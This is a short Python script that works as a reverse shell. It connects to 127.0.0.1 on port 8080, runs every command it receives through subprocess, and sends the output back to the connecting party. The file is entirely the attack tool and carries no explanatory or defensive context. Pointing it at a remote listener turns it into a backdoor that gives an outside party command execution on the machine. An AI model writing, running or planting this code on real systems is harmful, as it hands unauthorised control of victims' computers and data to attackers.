#!/usr/bin/env python
import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 8080))
while True:
    try:
        command = s.recv(2048)
        g = subprocess.check_output(str(command.decode('utf-8')))
        s.send(g)
    except Exception:
        s.send(b"[-]Error command, it's not connect")
        break
s.close()